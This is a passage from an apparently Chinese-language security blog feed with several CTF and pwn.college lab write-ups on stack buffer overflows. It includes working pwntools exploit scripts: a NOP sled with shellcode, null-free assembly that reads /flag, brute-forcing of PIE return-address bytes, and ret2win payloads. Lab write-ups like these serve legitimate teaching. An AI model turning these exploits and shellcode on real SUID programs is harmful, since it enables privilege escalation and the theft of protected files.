    <content type="html"><![CDATA[<h1 id="题目简介"><a href="#题目简介" class="headerlink" title="题目简介"></a>题目简介</h1><p>基础的栈溢出，在&#x2F;challenge目录下仅存在一个ELF文件，无源代码，需要我们构造输入劫持返回地址，根据题目名字能猜到是要劫持到shellcode起始地址</p><h1 id="漏洞点分析"><a href="#漏洞点分析" class="headerlink" title="漏洞点分析"></a>漏洞点分析</h1><p>分析一个程序首先要分析有没有溢出点，溢出点在哪里。分析方法和上一题一致，这里省略<br><br>接下来用checksec看一下开了哪些保护<br><br><img src="/../../../../../../../photos/pwn.college/intro/Pwn/Hijack-to-Shellcode/checksec.png"><br>发现保护全关，因此漏洞点就是缓冲区溢出覆写返回地址，劫持到我们的shellcode<br></p><h1 id="漏洞点利用"><a href="#漏洞点利用" class="headerlink" title="漏洞点利用"></a>漏洞点利用</h1><p>首先确定偏移量，可以采用和<a href="https://0x4a-210.github.io/2025/07/19/pwn.college/Intro-to-Cybersecurity/Pwn/Control-Hijack/">pwn.college题解：Control-Hijack</a>相同的方法，最后计算得到偏移量&#x3D;120<br><br>第二步需要确定返回地址，即我们的shellcode的起始地址是哪，首先很自然想到将shellcode放在返回地址后面<br><br>通过gdb，在challenge函数的ret指令处打下断点，程序将停在ret指令之前，此时再次使用x命令查看$rsp，由于ret本质是进行pop rip操作，因此rsp此时指向的第一个内存格子就是返回地址,如下图<br><br><img src="/../../../../../../../photos/pwn.college/intro/Pwn/Hijack-to-Shellcode/ret-breakpoint.png"><br>从图中看到返回地址&#x3D;0x7fffffffd608，因此应该将返回地址覆写为0x7fffffffd610，但是不能这么干，因为这样gdb调试得到的返回地址其实是不准确的，因为gdb会引入一些环境变量导致栈的空间改变<br><br>在实战中，更多采用NOP滑行的方法，即在真正的shellcode之前填入若干个NOP指令，返回地址只要确定一个大概范围，最后能命中这些NOP里的任何一个即可，这里我选择的是0x7fffffffd660，在返回地址后面0x50个字节。<br><br>现在可以编写出如下的exp了<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> struct<br><span class="hljs-keyword">import</span> os<br>returnAddr=<span class="hljs-number">0x7fffffffd660</span><br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;x86_64&#x27;</span>,log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>p = process(<span class="hljs-string">&#x27;/challenge/binary-exploitation-hijack-to-shellcode&#x27;</span>)<br>shellcode=asm(shellcraft.sh())<br>payload=<span class="hljs-string">b&quot;1&quot;</span>*<span class="hljs-number">120</span>+p64(returnAddr)+<span class="hljs-string">b&#x27;\x90&#x27;</span>*<span class="hljs-number">0x200</span>+shellcode<br>p.recvuntil(<span class="hljs-string">&#x27;Send your payload (up to 4096 bytes)!\n&#x27;</span>)<br>p.send(payload)<br>p.recv()<br>p.interactive()<br></code></pre></td></tr></table></figure><h1 id="getshell的临门一脚"><a href="#getshell的临门一脚" class="headerlink" title="getshell的临门一脚"></a>getshell的临门一脚</h1><p>很遗憾，上述脚本实测无法打通，这是由于pwn.college的问题，子进程并没有继承root权限，导致读取&#x2F;flag文件时权限错误<br><br>至于为什么出现这种原因，怀疑是pwn.college服务器的sh是指向bash的，由于目标程序是通过SUID获得了root权限，而bash解释器默认会阻止SUID程序的子进程继承权限（不同于zsh等）。所以调用&#x2F;bin&#x2F;sh没有root<br><br>有2种办法解决，一个是在调用&#x2F;bin&#x2F;sh之前进行一次setuid(0)的操作，另一种是改一下shellcode，直接通过系统调用完成输出flag，我这题采用了后者<br><br>最终exp.py如下<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> struct<br><span class="hljs-keyword">import</span> os<br>returnAddr=<span class="hljs-number">0x7fffffffd660</span><br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;x86_64&#x27;</span>,log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>p = process(<span class="hljs-string">&#x27;/challenge/binary-exploitation-hijack-to-shellcode&#x27;</span>)<br>shellcode= asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">.intel_syntax noprefix</span><br><span class="hljs-string">mov r10,0x67616c662f2f2f2f</span><br><span class="hljs-string">shr r10,24</span><br><span class="hljs-string">push r10</span><br><span class="hljs-string">lea rdi,[rsp]</span><br><span class="hljs-string">xor rsi,rsi</span><br><span class="hljs-string">xor rax,rax</span><br><span class="hljs-string">push 2</span><br><span class="hljs-string">pop rax</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">mov rdi,rax</span><br><span class="hljs-string">sub rsp,100</span><br><span class="hljs-string">lea rsi,[rsp]</span><br><span class="hljs-string">xor rdx,rdx</span><br><span class="hljs-string">push 100</span><br><span class="hljs-string">pop rdx</span><br><span class="hljs-string">xor rax,rax</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">xor rdi,rdi</span><br><span class="hljs-string">push 1</span><br><span class="hljs-string">pop rdi</span><br><span class="hljs-string">lea rsi,[rsp]</span><br><span class="hljs-string">xor rax,rax</span><br><span class="hljs-string">push 1</span><br><span class="hljs-string">pop rax</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>)<br>payload=<span class="hljs-string">b&quot;1&quot;</span>*<span class="hljs-number">120</span>+p64(returnAddr)+<span class="hljs-string">b&#x27;\x90&#x27;</span>*<span class="hljs-number">0x200</span>+shellcode<br>p.recvuntil(<span class="hljs-string">&#x27;Send your payload (up to 4096 bytes)!\n&#x27;</span>)<br>p.send(payload)<br>output = p.recvall()<br><span class="hljs-built_in">print</span>(output.decode(errors=<span class="hljs-string">&#x27;ignore&#x27;</span>))<br></code></pre></td></tr></table></figure><p>最后也是成功拿到了flag<br><img src="/../../../../../../../photos/pwn.college/intro/Pwn/Hijack-to-Shellcode/flag.png"></p>]]></content>
    
    
    <categories>
      
      <category>pwn.college题解</category>
      
      <category>intro</category>
      
      <category>Pwn</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>堆栈平衡问题</title>
    <link href="/2025/07/19/Questions/%E5%A0%86%E6%A0%88%E5%B9%B3%E8%A1%A1%E9%97%AE%E9%A2%98/"/>
    <url>/2025/07/19/Questions/%E5%A0%86%E6%A0%88%E5%B9%B3%E8%A1%A1%E9%97%AE%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<h1 id="pwn的坑之堆栈平衡"><a href="#pwn的坑之堆栈平衡" class="headerlink" title="pwn的坑之堆栈平衡"></a>pwn的坑之堆栈平衡</h1><p>今天做了两道最基本的溢出题，就是劫持控制流到后门函数，思路和方法理论上是一样的，但是一道能打通一道打不通，至今百思不得其解，因此记录一下以待来日<br></p><span id="more"></span><h1 id="题目说明"><a href="#题目说明" class="headerlink" title="题目说明"></a>题目说明</h1><h2 id="ctfshow-pwn02"><a href="#ctfshow-pwn02" class="headerlink" title="ctfshow-pwn02"></a>ctfshow-pwn02</h2><p>第一题，是ctfshow上的题目，给了一个32位程序stack，拖到IDA里看一下，main调用了pwnme函数，溢出点在pwnme，还有一个stack函数调用的system<br><br><img src="/../../photos/Questions/Pwn-Q1/ctfshow-pwn02-main.png"><br><img src="/../../photos/Questions/Pwn-Q1/ctfshow-pwn02-pwnme.png"><br><img src="/../../photos/Questions/Pwn-Q1/ctfshow-pwn02-stack.png"><br>然后checksec看了下只开了NX，但无所谓了，又不执行shellcode，管它NX呢<br><br>接下来就是一些算偏移，找返回地址的操作<br><br>一系列操作以后得到偏移offset&#x3D;13，stack函数的地址&#x3D;0x804850f<br><br>然后写脚本，填充好垃圾数据，没开PIE的话把stack函数的地址写死就行，写出如下一个简单的脚本：<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&quot;linux&quot;</span>,arch=<span class="hljs-string">&quot;x86&quot;</span>,log_level=<span class="hljs-string">&quot;debug&quot;</span>)<br><span class="hljs-comment">#ioTube=remote(&quot;pwn.challenge.ctf.show&quot;,28311,level=&quot;debug&quot;)</span><br>ioTube=process(<span class="hljs-string">&quot;/home/ubuntu/CTF/Pwn/ctfshow-pwn02/stack&quot;</span>)<br>ioTube.recvuntil(<span class="hljs-string">&quot;32bits\n&quot;</span>)<br>returnAddr=<span class="hljs-number">0x804850f</span><br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">13</span>+p32(returnAddr)<br>ioTube.sendline(payload)<br>ioTube.recv()<br>ioTube.interactive()<br></code></pre></td></tr></table></figure><p>运行以后就可以直接拿到shell了</p><h2 id="BUUCTF-Pwn-rip"><a href="#BUUCTF-Pwn-rip" class="headerlink" title="BUUCTF-Pwn-rip"></a>BUUCTF-Pwn-rip</h2><p>然后来到第二题，也就作妖的这题，这是BUUCTF上的题目，Pwn下的第二题rip，给了一个pwn1的64位ELF文件（从下图的file输出可以看到）<br><br><img src="/../../photos/Questions/Pwn-Q1/BUUCTF-file.png"><br>拖到IDA里可以看到溢出点发生在main函数的gets<br><br><img src="/../../photos/Questions/Pwn-Q1/BUUCTF-rip-main.png"><br>然后有一个fun函数，直接调用了system<br><br><img src="/../../photos/Questions/Pwn-Q1/BUUCTF-rip-fun.png"><br>按道理直接劫持到这个fun就可以<br><br>那就算一下偏移，看到main里面的缓冲区在rbp-0xf，+8，offset&#x3D;23<br><br>再checksec，看到没开PIE<br><br><img src="/../../photos/Questions/Pwn-Q1/BUUCTF-rip-checksec.png"><br>那就可以直接在脚本里写死fun函数的地址，objdump看下fun函数在哪，如下图<br><br><img src="/../../photos/Questions/Pwn-Q1/BUUCTF-rip-objdump.png"><br>于是按道理，学着第一题的思路，填充好offset，把返回地址写死成0x401186就肯定可以拿到shell，脚本也是这么写的<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#ioTube=remote(&quot;pwn.challenge.ctf.show&quot;,28311,level=&quot;debug&quot;)</span><br>context(os=<span class="hljs-string">&quot;linux&quot;</span>,arch=<span class="hljs-string">&quot;x86_64&quot;</span>,log_level=<span class="hljs-string">&quot;debug&quot;</span>)<br>ioTube=process(<span class="hljs-string">&quot;/home/ubuntu/CTF/Pwn/pwn1&quot;</span>)<br>ioTube.recvuntil(<span class="hljs-string">&quot;please input\n&quot;</span>)<br>offset=<span class="hljs-number">23</span><br>returnAddr=<span class="hljs-number">0x401186</span><br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*offset+p64(returnAddr)<br>ioTube.sendline(payload)<br>ioTube.recv()<br>ioTube.interactive()<br></code></pre></td></tr></table></figure><p>但是，离谱的事情出现了，每次在interactive以后都会收到EOF<br><br><img src="/../../photos/Questions/Pwn-Q1/BUUCTF-rip-fail.png"><br>然后，如果改成下面这样的利用脚本，就没有问题<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#ioTube=remote(&quot;pwn.challenge.ctf.show&quot;,28311,level=&quot;debug&quot;)</span><br>context(os=<span class="hljs-string">&quot;linux&quot;</span>,arch=<span class="hljs-string">&quot;x86_64&quot;</span>,log_level=<span class="hljs-string">&quot;debug&quot;</span>)<br>ioTube=process(<span class="hljs-string">&quot;/home/ubuntu/CTF/Pwn/pwn1&quot;</span>)<br>ioTube.recvuntil(<span class="hljs-string">&quot;please input\n&quot;</span>)<br>offset=<span class="hljs-number">23</span><br>returnAddr=<span class="hljs-number">0x401187</span><br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*offset+p64(returnAddr)<br>ioTube.sendline(payload)<br>ioTube.recv()<br>ioTube.interactive()<br></code></pre></td></tr></table></figure><p>是的，仅仅是返回地址+1，后面又陆续尝试了别的返回地址，发现只要跳过fun函数的第一条指令，即push rbp，就可以<br><br>博主大感震撼并表示不理解，遂尝试gdb单步调试，看看到底怎么个事儿<br><br>从下面这张图可以明显看到rsp指向了我们要的0x401186，按道理ret指令结束后一定是去执行fun函数<br><br><img src="/../../photos/Questions/Pwn-Q1/debug1.png"><br>并且接着si调试，可以看到，甚至它真的进到fun函数里面了<br><br><img src="/../../photos/Questions/Pwn-Q1/debug2.png"><br>然后call system这里下个断点，可以正常执行完call指令前的所有指令<br><br><img src="/../../photos/Questions/Pwn-Q1/debug3.png"><br>但是，最离谱的是，现在，在call system这里按下c键，让它继续执行，直接就崩溃<br><img src="/../../photos/Questions/Pwn-Q1/fail.png"></p><h2 id="目前的理解"><a href="#目前的理解" class="headerlink" title="目前的理解"></a>目前的理解</h2><p>在网上搜索一番后，得知是堆栈平衡问题，在64位程序下，需要堆栈进行16位对齐，可以采用填充ret指令的方法<br><br>对于上述第二题，为什么必须要跳过push rbp指令，是因为push操作会破坏已经构造好的堆栈寄存器，所以不能劫持到0x401186<br><br>而由于第一题是32位，不存在堆栈平衡问题，所以可以按照上述方法打通<br><br>总结一下，做题时遇到莫名其妙的EOF，考虑避免劫持到带有push rbp指令的地址，如果还不行，考虑用ret指令填充到16的倍数<br></p>]]></content>
    
    
    <categories>
      
      <category>疑问和踩过的一些坑</category>
      
      <category>Pwn</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>NULL-Free-Shellcode</title>
    <link href="/2025/07/19/pwn.college/Intro-to-Cybersecurity/Pwn/NULL-Free-Shellcode/"/>
    <url>/2025/07/19/pwn.college/Intro-to-Cybersecurity/Pwn/NULL-Free-Shellcode/</url>
    
    <content type="html"><![CDATA[<h1 id="题目简介"><a href="#题目简介" class="headerlink" title="题目简介"></a>题目简介</h1><p>这道题说了，会将输入的内容当作代码来执行，但是会对输入的内容做一些限制<br></p><span id="more"></span><h1 id="漏洞点分析与利用"><a href="#漏洞点分析与利用" class="headerlink" title="漏洞点分析与利用"></a>漏洞点分析与利用</h1><p>这道题给了源码，也没有什么easy和hard区分，因此主要记录一个trick，即如何清除shellcode里的0x00字节<br><br>漏洞点简单介绍一下，看源代码中，留了4096个字节读取我们的输入，然后执行过滤逻辑，遇到0x00就会退出<br><br>那么如何清除0字节？根据0字节的来源有2种方法：<br><br>1 对寄存器赋值0时会产生0字节，因此避免直接使用mov指令将寄存器清零，而应该使用xor指令<br><br>2 对寄存器赋值一个较小的数字会产生0字节，因此对寄存器赋值时，如果目标值很小，需要采用先把操作数push进栈，再pop出栈到寄存器的方法&lt;br<br>有了上面的理论，就很好构造shellcode了：<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;x86_64&#x27;</span>,log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>shellcode = asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">.intel_syntax noprefix</span><br><span class="hljs-string">mov r10,0x67616c662f2f2f2f</span><br><span class="hljs-string">shr r10,24</span><br><span class="hljs-string">push r10</span><br><span class="hljs-string">lea rdi,[rsp]</span><br><span class="hljs-string">xor rsi,rsi</span><br><span class="hljs-string">xor rax,rax</span><br><span class="hljs-string">push 2</span><br><span class="hljs-string">pop rax</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">mov rdi,rax</span><br><span class="hljs-string">sub rsp,100</span><br><span class="hljs-string">lea rsi,[rsp]</span><br><span class="hljs-string">xor rdx,rdx</span><br><span class="hljs-string">push 100</span><br><span class="hljs-string">pop rdx</span><br><span class="hljs-string">xor rax,rax</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">xor rdi,rdi</span><br><span class="hljs-string">push 1</span><br><span class="hljs-string">pop rdi</span><br><span class="hljs-string">lea rsi,[rsp]</span><br><span class="hljs-string">xor rax,rax</span><br><span class="hljs-string">push 1</span><br><span class="hljs-string">pop rax</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>)<br>payload=shellcode<br>ioTube=process(<span class="hljs-string">&quot;/challenge/binary-exploitation-null-free-shellcode&quot;</span>)<br>ioTube.recvuntil(<span class="hljs-string">&quot;Reading 0x1000 bytes from stdin.\n&quot;</span>)<br>ioTube.send(payload)<br>response=ioTube.recvall().decode(errors=<span class="hljs-string">&quot;ignore&quot;</span>)<br><span class="hljs-keyword">if</span> <span class="hljs-string">r&quot;pwn.college&#123;&quot;</span> <span class="hljs-keyword">in</span> response:<br>    <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;flag.txt&quot;</span>,<span class="hljs-string">&quot;w&quot;</span>).write(response)<br></code></pre></td></tr></table></figure><p>解释一下第一行传flag字符串参数为什么要这么写，首先&#x2F;flag只有5个字节，会产生0字节，所以用斜线（即2f）填充，但这样会导致打开文件失败，所以当复制完成后，通过右移指令把多余的2f移丢即可<br></p>]]></content>
    
    
    <categories>
      
      <category>pwn.college题解</category>
      
      <category>intro</category>
      
      <category>Pwn</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>String-Lengths-hard</title>
    <link href="/2025/07/19/pwn.college/Intro-to-Cybersecurity/Pwn/String-Lengths-hard/"/>
    <url>/2025/07/19/pwn.college/Intro-to-Cybersecurity/Pwn/String-Lengths-hard/</url>
    
    <content type="html"><![CDATA[<h1 id="题目简介"><a href="#题目简介" class="headerlink" title="题目简介"></a>题目简介</h1><p>这题除了PIE以外，对输入还存在额外的校验，具体是什么需要我们去分析<br></p><span id="more"></span><h1 id="漏洞点分析"><a href="#漏洞点分析" class="headerlink" title="漏洞点分析"></a>漏洞点分析</h1><p>首先依然是chencksec，可以看到除了cananry全部开启，大概率和PIE的那题一样，需要触发后门函数<br><br>拖到IDA里看一下果不其然，有熟悉的win_authed，并且溢出点在challenge中<br><br>所以漏洞点和PIEs类似，劫持控制流到win函数<br></p><h1 id="漏洞点利用"><a href="#漏洞点利用" class="headerlink" title="漏洞点利用"></a>漏洞点利用</h1><p>首先看objdump看win函数的地址，最后两个字节是0x2142，然后依然是要返回到校验逻辑的后面，选择0x215e<br><br>偷个懒，具体的操作方法就不放图了，可以参考PIE那一题的Wp<a href="https://0x4a-210.github.io/2025/07/19/pwn.college/Intro-to-Cybersecurity/Pwn/PIEs-hard/">PIEs-hard题解</a></p><p>之后看偏移地址，IDA里看到最后dest距离rbp0x50个字节，所以offset&#x3D;0x50+0x8&#x3D;88<br><br>注意：这里的buf是malloc申请到的堆上的空间，不能看buf的地址，要从后面memcpy的操作，看出最后是把输入复制到位于栈上的dest处<br><br><img src="/../../../../../../../photos/pwn.college/intro/Pwn/String-Lengths/offset.png"><br>最后，最关键的地方来了，challenge会调用strlen函数对我们的输入长度存在校验，不能超过43，但光垃圾数据填充就要88个，显然不行<br><br>这里卡了很久，直到看到对strlen函数的一个说明:<br><br><em><strong>The strlen() function calculates the length of the string pointed to by s, excluding the terminating null byte (‘\0’).</strong></em><br>翻译一下就是这个函数会计算字符串的长度，直到遇到终止字节，即0x00<br><br>很好，那思路就应该是用0x00作为垃圾数据填充88字节即可，这样一看这题一下子就变得简单了，之前还卡了一个下午<br><br>也算是长了个教训，还是基础不扎实，对这些库函数还是停留在用的层面，不了解深层的实现机制……<br><br>最终的利用脚本如下<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;x86_64&#x27;</span>,log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>offset=<span class="hljs-number">88</span><br>returnAddr=<span class="hljs-number">0x415e</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    payload=<span class="hljs-string">b&#x27;\x00&#x27;</span>*offset+p16(returnAddr)<br>    ioTube=process(<span class="hljs-string">&quot;/challenge/binary-exploitation-null-write&quot;</span>)<br>    ioTube.recvuntil(<span class="hljs-string">&quot;Send your payload (up to 4096 bytes)!\n&quot;</span>)<br>    ioTube.send(payload)<br>    response=ioTube.recv().decode()<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">r&quot;pwn.college&#123;&quot;</span> <span class="hljs-keyword">in</span> response:<br>        <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;flag.txt&quot;</span>,<span class="hljs-string">&quot;w&quot;</span>).write(response)<br>        <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><p>然后去flag.txt里找就行了<br><br><img src="/../../../../../../../photos/pwn.college/intro/Pwn/String-Lengths/flag.png"></p>]]></content>
    
    
    <categories>
      
      <category>pwn.college题解</category>
      
      <category>intro</category>
      
      <category>Pwn</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>PIEs-hard</title>
    <link href="/2025/07/19/pwn.college/Intro-to-Cybersecurity/Pwn/PIEs-hard/"/>
    <url>/2025/07/19/pwn.college/Intro-to-Cybersecurity/Pwn/PIEs-hard/</url>
    
    <content type="html"><![CDATA[<h1 id="题目简介"><a href="#题目简介" class="headerlink" title="题目简介"></a>题目简介</h1><p>程序开启了PIE保护，因此程序每次加载的基地址都是不确定的；我们无法再得知后门函数或者shellcode的真实地址，需要通过爆破的方法拿到shell<br></p><span id="more"></span><p>通过这题记录一个小trick，有关PIE的基础理论在这里<a href="https://0x4a-210.github.io/2025/07/19/TogetherReview/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%80%BB%E7%BB%93/">二进制总结</a></p><h1 id="漏洞点分析"><a href="#漏洞点分析" class="headerlink" title="漏洞点分析"></a>漏洞点分析</h1><p>首先checksec看一下，发现除了cananry全部保护开启，直接断绝shellcode的念头<br><br><img src="/../../../../../../../photos/pwn.college/intro/Pwn/PIEs/checksec.png"><br>先考虑有没有后门函数，将二进制文件拖入IDA，可以看到有一个win_auth函数，同时溢出点在challenge函数<br><br>这样的话漏洞点就清晰了，就是通过覆盖challenge函数的返回地址来跳转到win_auth即可<br></p><h1 id="漏洞点利用"><a href="#漏洞点利用" class="headerlink" title="漏洞点利用"></a>漏洞点利用</h1><p>首先计算偏移，同样在IDA里看缓冲区相对于rbp的偏移然后+8即可，算出来是120<br><br>接下来通过objdump看到win函数相对于程序装载基地址的偏移&#x3D;0x1ab2<br><br><img src="/../../../../../../../photos/pwn.college/intro/Pwn/PIEs/win_auth.png"><br>但是这里有一个问题，我们不能跳转到0x1ab2，因为win函数入口处存在对参数值的校验，只能跳转到校验逻辑的后面，比如0x1ace<br><br>最后，我们需要覆盖最后一个半字节，爆破剩下的15位十六进制数<br><br>一个小trick，个人习惯把偏移加上个1、2左右，从做的题目来看，这样可以更早撞上（maybe程序装载基地址倒数第4位是0的概率更小？不太确定……），但不管怎么说，碰撞16次以后就有很高的概率可以碰对了<br><br>最后的利用脚本如下：<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;x86_64&#x27;</span>,log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>offset=<span class="hljs-number">120</span><br>returnAddr=<span class="hljs-number">0x2ace</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    payload=<span class="hljs-string">b&#x27;a&#x27;</span>*offset+p16(returnAddr)<br>    ioTube=process(<span class="hljs-string">&quot;/challenge/binary-exploitation-pie-overflow&quot;</span>)<br>    ioTube.recvuntil(<span class="hljs-string">&quot;Send your payload (up to 4096 bytes)!\n&quot;</span>)<br>    ioTube.send(payload)<br>    response=ioTube.recv().decode()<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">r&quot;pwn.college&#123;&quot;</span> <span class="hljs-keyword">in</span> response:<br>        <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;flag.txt&quot;</span>,<span class="hljs-string">&quot;w&quot;</span>).write(response)<br>        <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><p>脚本运行完毕后可以在当前目录的flag.txt中找到flag<br><br><img src="/../../../../../../../photos/pwn.college/intro/Pwn/PIEs/flag.png"></p>]]></content>
    
    
    <categories>
      
      <category>pwn.college题解</category>
      
      <category>intro</category>
      
      <category>Pwn</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Control-Hijack</title>
    <link href="/2025/07/19/pwn.college/Intro-to-Cybersecurity/Pwn/Control-Hijack/"/>
    <url>/2025/07/19/pwn.college/Intro-to-Cybersecurity/Pwn/Control-Hijack/</url>
    
    <content type="html"><![CDATA[<h1 id="题目简介"><a href="#题目简介" class="headerlink" title="题目简介"></a>题目简介</h1><p>需要我们劫持函数的控制流，但具体劫持到哪，需要反汇编整个程序来决定</p><span id="more"></span><h1 id="漏洞点分析"><a href="#漏洞点分析" class="headerlink" title="漏洞点分析"></a>漏洞点分析</h1><p>首先将&#x2F;challenge下的二进制文件下载到本地，拖到IDA里看一下，（F5反编译，即看C伪代码）<br><br>个人习惯首先观察main函数<br><br><img src="/../../../../../../../photos/pwn.college/intro/Pwn/Control-Hijack/main.png"><br>可以看到main调用了challenge，并且main里面没有发现溢出点，那只能进challenge里看一下<br><br><img src="/../../../../../../../photos/pwn.college/intro/Pwn/Control-Hijack/challenge.png"><br>很好，在challenge中找到了溢出点read，给了4096个字节，但缓冲区只有14个字节，完全够覆盖到返回地址<br><br>然后checksec命令查看程序开启了哪些保护<br></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">checksec /challenge/binary-exploitation-control-hijack<br></code></pre></td></tr></table></figure><p>如下图，发现只开了NX<br><br><img 